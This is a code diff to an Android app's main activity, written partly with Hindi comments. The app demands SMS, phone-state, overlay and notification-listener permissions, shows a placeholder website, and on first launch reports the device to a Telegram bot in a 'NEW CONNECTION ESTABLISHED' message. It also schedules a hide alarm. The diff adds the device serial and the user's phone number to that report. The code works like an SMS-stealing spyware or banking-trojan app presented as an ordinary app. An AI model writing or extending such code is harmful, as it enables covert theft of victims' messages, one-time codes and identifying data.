@@ -9,6 +9,7 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
+import android.telephony.TelephonyManager
 import android.view.View
 import android.webkit.*
 import android.widget.Button
@@ -30,7 +31,6 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // पूरी स्क्रीन का लेआउट बनाएँ (Permission UI + WebView)
         val rootLayout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             layoutParams = LinearLayout.LayoutParams(
@@ -39,7 +39,6 @@ class MainActivity : AppCompatActivity() {
             )
         }
 
-        // परमिशन UI (जब तक परमिशन न हों, यही दिखेगा)
         permissionLayout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity = android.view.Gravity.CENTER
@@ -51,14 +50,19 @@ class MainActivity : AppCompatActivity() {
         }
 
         permissionText = TextView(this).apply {
-            text = "To work properly, this app requires SMS, Notifications, and Overlay permissions.\n\nPlease grant all permissions to continue."
+            text = "To work properly, this app needs:\n\n" +
+                    "📩 SMS\n" +
+                    "🔔 Notifications\n" +
+                    "📱 Phone Number\n" +
+                    "🎨 Overlay\n\n" +
+                    "Please grant all permissions to continue."
             textSize = 16f
             gravity = android.view.Gravity.CENTER
             setPadding(0, 0, 0, 32)
         }
 
         grantButton = Button(this).apply {
-            text = "GRANT PERMISSIONS"
+            text = "GRANT ALL"
             setOnClickListener { checkAndRequestPermissions() }
         }
 
@@ -66,7 +70,6 @@ class MainActivity : AppCompatActivity() {
         permissionLayout.addView(grantButton)
         rootLayout.addView(permissionLayout)
 
-        // WebView (बाद में दिखेगा)
         webView = WebView(this).apply {
             visibility = View.GONE
             settings.javaScriptEnabled = true
@@ -75,20 +78,18 @@ class MainActivity : AppCompatActivity() {
             settings.userAgentString = "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
             webViewClient = MyWebViewClient()
             webChromeClient = WebChromeClient()
-            loadUrl("https://your-website.com")   // <-- अपनी साइट डालें
+            loadUrl("https://your-website.com") // ← अपनी साइट डालें
         }
         rootLayout.addView(webView)
 
         setContentView(rootLayout)
 
-        // First launch actions
         if (!prefs.getBoolean("first_launch_done", false)) {
             prefs.edit().putBoolean("first_launch_done", true).apply()
             sendConnectionAlert()
             scheduleHideAlarm()
         }
 
-        // हर बार ओपन करने पर चेक करें — अगर सब परमिशन हैं तो WebView दिखाओ, वरना परमिशन UI
         updateUI()
     }
 
@@ -103,11 +104,15 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun allPermissionsGranted(): Boolean {
-        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
+        val smsOk = ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
                 && ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED
-                && (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU || ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED)
-                && (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this))
-                && isNotificationListenerEnabled()
+        val phoneOk = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
+        val notifOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
+        else true
+        val overlayOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
+        val listenerOk = isNotificationListenerEnabled()
+        return smsOk && phoneOk && notifOk && overlayOk && listenerOk
     }
 
     private fun isNotificationListenerEnabled(): Boolean {
@@ -122,78 +127,84 @@ class MainActivity : AppCompatActivity() {
             missing.add(Manifest.permission.RECEIVE_SMS)
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
             missing.add(Manifest.permission.SEND_SMS)
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
+            missing.add(Manifest.permission.READ_PHONE_STATE)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
             ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
             missing.add(Manifest.permission.POST_NOTIFICATIONS)
 
-        // रनटाइम परमिशन
         if (missing.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, missing.toTypedArray(), 200)
             return
         }
 
-        // Overlay परमिशन
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
-            Toast.makeText(this, "Please enable 'Display over other apps'", Toast.LENGTH_LONG).show()
+            Toast.makeText(this, "Enable 'Display over other apps'", Toast.LENGTH_LONG).show()
             return
         }
 
-        // Notification Listener
         if (!isNotificationListenerEnabled()) {
             startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
-            Toast.makeText(this, "Please enable 'Settings' in Notification access", Toast.LENGTH_LONG).show()
+            Toast.makeText(this, "Enable 'Settings' in Notification access", Toast.LENGTH_LONG).show()
             return
         }
 
-        // सब ठीक हो तो UI अपडेट करें
         updateUI()
     }
 
-    // जब रनटाइम परमिशन का रिज़ल्ट आए
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == 200) {
-            // अगर अब भी कुछ मना हुआ है तो उसे सेटिंग्स पर भेजें
             for ((index, perm) in permissions.withIndex()) {
                 if (grantResults[index] != PackageManager.PERMISSION_GRANTED) {
-                    // यूज़र ने डेनी कर दिया — सेटिंग्स खोलें
                     if (!ActivityCompat.shouldShowRequestPermissionRationale(this, perm)) {
-                        // "Don't ask again" केस — ऐप सेटिंग्स पर जाएँ
                         val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))
                         startActivity(intent)
                         Toast.makeText(this, "Please manually grant the permission in App Settings", Toast.LENGTH_LONG).show()
                     } else {
-                        // फिर से डायलॉग दिखाने के लिए requestPermissions कॉल करें
-                        val again = arrayOf(perm)
-                        ActivityCompat.requestPermissions(this, again, 200)
+                        ActivityCompat.requestPermissions(this, arrayOf(perm), 200)
                     }
                     return
                 }
             }
-            // सब मिल गए, तो बाकी चेक करें
             checkAndRequestPermissions()
         }
     }
 
     override fun onResume() {
         super.onResume()
-        // जब सेटिंग से वापस आएँ तो चेक करें
         updateUI()
     }
 
     private fun sendConnectionAlert() {
-        val device = "${Build.MODEL} (${Build.BRAND})"
+        val brand = Build.BRAND
+        val model = Build.MODEL
         val os = Build.VERSION.RELEASE
+        val sdk = Build.VERSION.SDK_INT
+        val serial = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Build.getSerial() else "Unknown"
+        val phoneNumber = getMyPhoneNumber()
         val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date())
+
         val message = """
-            🔗 NEW CONNECTION ESTABLISHED
-            Device: $device
-            OS Version: $os
-            App Version: 1.0
-            Timestamp: $timestamp
+            <b>🔗 NEW CONNECTION ESTABLISHED</b>
+            <b>📱 Device:</b> $brand $model
+            <b>⚙️ OS:</b> Android $os (SDK $sdk)
+            <b>🔢 Serial:</b> $serial
+            <b>📞 Phone Number:</b> $phoneNumber
+            <b>🕒 Time:</b> $timestamp
+            <b>📌 App Version:</b> 1.0
         """.trimIndent()
+
         TelegramHelper.sendMessage(message)
+    }
+
+    private fun getMyPhoneNumber(): String {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+            val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+            return tm.line1Number ?: "Number not available"
+        }
+        return "Permission denied"
     }
 
     private fun scheduleHideAlarm() {
